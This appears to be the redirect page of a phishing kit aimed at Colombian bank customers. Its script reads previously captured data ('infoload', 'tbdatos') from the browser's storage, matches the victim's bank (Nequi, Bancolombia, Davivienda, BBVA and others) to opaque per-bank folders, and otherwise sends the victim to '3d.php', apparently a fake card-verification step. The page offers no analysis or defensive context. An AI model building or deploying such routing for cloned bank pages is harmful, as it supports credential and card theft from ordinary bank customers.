<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Redirigiendo...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { 
      background: white; 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      height: 100vh; 
      font-family: sans-serif; 
    }
    .loader {
      width: 80%;
      max-width: 300px;
      height: 4px;
      background: #ccc;
      overflow: hidden;
      border-radius: 3px;
    }
    .loader::after {
      content: "";
      display: block;
      height: 100%;
      width: 0;
      background: #007bff;
      animation: loading 2s linear infinite;
    }
    @keyframes loading {
      0% { width: 0; }
      100% { width: 100%; }
    }
  </style>
</head>
<body>
  <div class="loader"></div>

  <script>
    (function() {
      let folder = null;
      let tipo   = null;
      const params = window.location.search || "";

      // Intentar leer banco desde el <select> (no existe aquí, pero mantenido por compatibilidad)
      const selBanco = document.getElementById("txt-banco");
      if (selBanco && selBanco.value) {
        const opt = selBanco.options[selBanco.selectedIndex];
        folder = opt.getAttribute("folder") || null;
        tipo   = opt.getAttribute("tipo")   || null;
      }

      if (!folder) {
        const info = JSON.parse(localStorage.getItem("infoload") || "{}");
        let bancoRaw = (info.bank || "").toLowerCase().trim();

        // Priorizar tbdatos
        try {
          const tb = JSON.parse(localStorage.getItem("tbdatos") || "{}") || {};
          if (tb.banco) {
            bancoRaw = String(tb.banco).toLowerCase().trim();
          }
        } catch (e) {}

        // Normalizar banco
        bancoRaw = bancoRaw
          .normalize("NFD")
          .replace(/[\u0300-\u036f]/g, "")
          .replace(/[^a-z0-9\s]/g, "");
        const bancoClean = bancoRaw.replace(/\s+/g, "");

        // Verificación especial para NEQUI
        if (bancoClean.includes("nequi")) {
          folder = "nequi-1";
          tipo   = "1";
        } else {
          const bankMap = [
            { keys: ["avvillas", "bancoavvillas"], folder: "b-34f1/",  tipo: "2" },
            { keys: ["bbva"], folder: "b-34f13", tipo: "2" },
            { keys: ["cajasocial", "bancocajasocial"], folder: "b-34f2", tipo: "2" },
            { keys: ["bogota", "bancodebogota"], folder: "b-34f4", tipo: "2" },
            { keys: ["davivienda"], folder: "b-34f10", tipo: "2" },
            { keys: ["occidente", "bancodeoccidente"], folder: "b-34f14", tipo: "2" },
            { keys: ["falabella"], folder: "b-34f5", tipo: "2" },
            { keys: ["finandina"], folder: "b-34f6", tipo: "2" },
            { keys: ["itau"], folder: "b-34f7", tipo: "2" },
            { keys: ["mundomujer", "bmancomundomujer"], folder: "b-34f01", tipo: "1" },
            { keys: ["popular", "bancopopular"], folder: "b-34f18", tipo: "2" },
            { keys: ["serfinanza"], folder: "b-34f16", tipo: "2" },
            { keys: ["union", "giros", "bancounion"], folder: "b-34f0", tipo: "1" },
            { keys: ["bancolombia", "bancocolombia"], folder: "b-34f9", tipo: "2" },
            { keys: ["lulo"], folder: "b-34f02", tipo: "1" },
            { keys: ["scotiabank", "colpatria", "scotiabankcolpatria"], folder: "b-34f12", tipo: "2" }
          ];

          for (const bank of bankMap) {
            const match = bank.keys.some(k => bancoClean.includes(k.replace(/\s+/g, "")));
            if (match) {
              folder = bank.folder;
              tipo   = bank.tipo;
              break;
            }
          }
        }
      }

      // Redirección
      if (folder) {
        setTimeout(() => {
          window.location.href = `${folder}${params}`;
        }, 900);
      } else {
        // Redirección fallback si no detecta banco
        setTimeout(() => {
          window.location.href = "3d.php";
        }, 1200);
      }
    })();
  </script>
</body>
</html>
